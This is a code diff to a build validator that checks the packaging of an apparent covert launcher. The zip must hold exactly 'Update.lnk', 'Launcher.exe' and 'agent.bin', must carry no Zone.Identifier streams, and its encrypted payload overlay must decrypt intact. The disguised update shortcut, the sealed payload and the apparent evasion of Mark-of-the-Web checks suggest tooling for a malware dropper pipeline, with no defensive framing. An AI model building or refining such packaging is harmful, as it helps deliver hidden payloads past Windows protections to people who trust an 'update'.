@@ -25,6 +25,7 @@ export interface ValidateLauncherParams {
   payloadPlain: Buffer;
   sealKey: Buffer;
   sealIv: Buffer;
+  agentBin: Buffer;
   prevLauncherHash: string | null;
   prevLnkHash: string | null;
 }
@@ -210,20 +211,18 @@ export async function validateLauncherBuild(
     return { ok, rows };
   }
   const entries = readZipEntries(zip);
-  if (entries.count === 2) {
-    pass("zip entry count", `exactly 2 entries (${entries.names.join(", ")})`);
+  const wantNames = ["Update.lnk", "Launcher.exe", "agent.bin"];
+  if (entries.count === wantNames.length) {
+    pass("zip entry count", `exactly ${wantNames.length} entries (${entries.names.join(", ")})`);
   } else {
-    fail("zip entry count", `got ${entries.count}, expected 2`);
+    fail("zip entry count", `got ${entries.count}, expected ${wantNames.length}`);
   }
-  if (entries.count === 2 && entries.names.includes("Update.lnk")) {
-    pass("zip contains Update.lnk");
-  } else {
-    fail("zip contains Update.lnk");
-  }
-  if (entries.count === 2 && entries.names.includes("Launcher.exe")) {
-    pass("zip contains Launcher.exe");
-  } else {
-    fail("zip contains Launcher.exe");
+  for (const w of wantNames) {
+    if (entries.count === wantNames.length && entries.names.includes(w)) {
+      pass(`zip contains ${w}`);
+    } else {
+      fail(`zip contains ${w}`);
+    }
   }
   const zoneHit = entries.names.filter((n) => n.includes("Zone.Identifier"));
   if (zoneHit.length === 0) {
@@ -297,7 +296,7 @@ export async function validateLauncherBuild(
 
   // ---- 7. payload round-trip byte-identical ----
   try {
-    const dec = decryptOverlay(exe, p.sealKey, p.sealIv);
+    const dec = decryptOverlay(exe, p.sealKey, p.sealIv, p.agentBin);
     if (dec.payload.equals(p.payloadPlain)) {
       pass("payload round-trip byte-identical", `${dec.payload.length} bytes`);
     } else {
